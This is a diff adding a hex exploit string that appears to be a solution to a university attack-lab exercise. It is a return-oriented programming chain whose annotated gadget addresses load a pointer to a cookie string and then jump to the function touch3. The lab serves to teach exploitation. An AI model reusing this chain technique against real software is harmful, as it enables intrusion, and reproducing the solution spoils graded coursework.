@@ -1,0 +1,14 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d3 14 40 00 00 00 00 00	/* gadget addr. for mov %rsp to %rax; 0x004014d3 */
+a4 14 40 00 00 00 00 00 /* gadget addr. for mov %rax to %rdi; 0x004014a4 */
+99 14 40 00 00 00 00 00 /* gadget addr. for pop %rax; 0x401499 */
+48 00 00 00 00 00 00 00 /* pop 0x48 into rax (offset needed to get to our string mem. addr.) */
+55 15 40 00 00 00 00 00 /* gadget addr. for mov %eax to %edx; 0x00401555 */
+6e 15 40 00 00 00 00 00 /* gadget addr. for mov %edx to %ecx; 0x0040156e */
+03 15 40 00 00 00 00 00 /* gadget addr. for mov %ecx to %esi; 0x00401503 */
+cd 14 40 00 00 00 00 00 /* gadget addr. for add_xy; 0x004014cd */
+a4 14 40 00 00 00 00 00 /* gadget addr. for mov %rax to %rdi; 0x004014a4 */
+f9 13 40 00 00 00 00 00 /* address for touch3; 0x004013f9 */
+37 38 33 63 64 32 64 64 /* cookie val as a string */
